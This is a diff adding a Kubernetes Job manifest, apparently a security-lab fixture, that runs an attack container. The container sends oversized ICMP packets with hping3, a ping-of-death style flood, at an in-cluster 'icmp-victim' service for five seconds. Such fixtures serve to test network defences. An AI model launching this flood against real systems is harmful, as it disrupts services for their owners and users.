@@ -1,0 +1,25 @@
+# Thanks to https://hub.docker.com/u/olegvorobyov90
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: ping-death-job
+  namespace: darkforce
+  labels:
+    app: ping-death
+spec:
+  template:
+    metadata:
+      labels:
+        app: ping-death
+    spec:
+      containers:
+      - name: ping-death-attack
+        image: evantage/attack-leap15:0.1
+        command: ["/bin/bash", "-c", "timeout 5 hping3 --icmp --data 40000 -p 80 icmp-victim-0.icmp-victim.avalon.svc.cluster.local || true"]
+        securityContext:
+          capabilities:
+            add:
+              - NET_ADMIN
+              - NET_RAW
+      restartPolicy: Never
+  backoffLimit: 0
